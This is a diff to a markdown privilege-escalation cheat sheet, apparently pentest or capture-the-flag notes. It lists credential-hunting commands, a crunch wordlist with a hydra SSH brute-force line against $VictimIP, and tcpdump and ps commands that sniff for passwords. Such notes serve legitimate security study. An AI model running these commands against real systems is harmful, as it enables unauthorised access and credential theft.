@@ -38,18 +38,29 @@ Other tools:
 - LinEnum: https://github.com/rebootuser/LinEnum
 - LinPeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
-## Brute force ssh
+## Credentials
 
+### Hidden in text files
+
+Check:
+- `env`
+- `cat .bashrc`
+- `su - root`
+- `sudo -l`
+
+### Brute force ssh with password hints
+
+With a hint of password:
 ```
-crunch 11 11 -t Password%%% > wordlist
+crunch 19 19 -t Hint_Of_Password%%% > wordlist
 hydra -l user -P wordlist $VictimIP -t 4 ssh -V
 ```
 
-## Services
+### Hidden passwords in Services
 
 ```
 sudo tcpdump -i lo -A | grep "pass"
-watch -n1 "ps auxww | grep pass | grep -v grep | fold -s
+watch -n1 "ps aux | grep pass | grep -v grep | fold -s
 ```
 
 ## Cron jobs
